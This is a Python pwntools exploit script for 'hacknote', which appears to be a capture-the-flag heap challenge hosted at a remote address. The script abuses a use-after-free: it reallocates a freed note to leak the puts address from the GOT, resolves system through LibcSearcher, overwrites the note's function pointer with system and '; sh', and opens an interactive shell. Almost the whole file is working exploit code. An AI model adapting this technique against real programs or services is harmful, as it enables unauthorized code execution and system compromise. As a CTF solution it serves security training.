#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "hacknote"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 32693

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sa('Your choice :', str(1))
	sa('Note size :', str(size))
	sa('Content :', text)

def rm(index):
	sa('Your choice :', str(2))
	sa(':', str(index))

def dp(index):
	sa('Your choice :', str(3))
	sa(':', str(index))	

def q():
	sa('Your choice :', str(4))

#--------------------------Exploit--------------------------
def exploit():
	#li(rl())
	ad(0x10, 'A')
	ad(0x10, 'B')
	rm(0)
	rm(1)

	dump_addr = 0x0804862B
	ad(0x8, p32(dump_addr) + p32(exe.got['puts']))
	dp(0)
	puts_addr = u32(r(4))
	li('puts_addr: ' + hex(puts_addr))
	libc = LibcSearcher('puts', puts_addr)
	libc_base = puts_addr - libc.dump('puts')
	sys_addr = libc_base + libc.dump('system')
	#sh_addr = libc_base + libc.dump('str_bin_sh')
	#rm(3)

	rm(2)
	ad(0x8, p32(sys_addr) + '; sh')
	dp(0)
	#db()



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

